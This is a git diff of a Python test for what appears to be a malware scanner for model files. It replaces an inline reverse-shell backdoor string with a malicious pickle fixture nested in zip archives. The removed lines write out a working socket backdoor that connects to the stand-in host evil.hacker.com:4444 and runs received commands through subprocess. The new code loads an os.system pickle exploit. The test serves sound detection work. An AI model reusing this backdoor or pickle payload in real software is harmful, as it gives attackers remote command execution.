@@ -12,6 +12,7 @@ import base64
 import struct
 from pathlib import Path
 from model_total import IssueType
+from tests.fixtures.malicious_pickles import generate_malicious_pickles
 
 # These imports are for creating test files - the actual libraries don't need to be installed
 # since we're just creating mock files that look like they use these libraries
@@ -42,30 +43,21 @@ class TestScanners:
         - Suspicious file 3 levels down
         """
         server_url, temp_dir = test_file_server
-        
-        # Create malicious content at deepest level
-        malicious_content = """
-import os
-import socket
-import subprocess
 
-# Suspicious backdoor code
-def establish_backdoor():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("evil.hacker.com", 4444))
-    while True:
-        cmd = s.recv(1024).decode()
-        result = subprocess.run(cmd, shell=True, capture_output=True)
-        s.send(result.stdout)
+        # Generate malicious pickle using fixture helper
+        malicious_pickles = generate_malicious_pickles()
+        # Use os.system exploit as it's reliably detected by all scanners
+        malicious_pickle_bytes = malicious_pickles['os_system_protocol_4']
 
-if __name__ == "__main__":
-    establish_backdoor()
-"""
-        
-        # Level 3: Create innermost ZIP with malicious file
+        # Create malicious pickle file at deepest level
+        malicious_pickle_path = os.path.join(temp_dir, "malicious_model.pkl")
+        with open(malicious_pickle_path, "wb") as f:
+            f.write(malicious_pickle_bytes)
+
+        # Level 3: Create innermost ZIP with malicious pickle file
         inner_zip_path = os.path.join(temp_dir, "level3.zip")
         with zipfile.ZipFile(inner_zip_path, "w") as inner_zip:
-            inner_zip.writestr("backdoor.py", malicious_content)
+            inner_zip.write(malicious_pickle_path, "malicious_model.pkl")
             inner_zip.writestr("innocent.txt", "This is innocent content")
         
         # Level 2: Create middle ZIP containing level 3
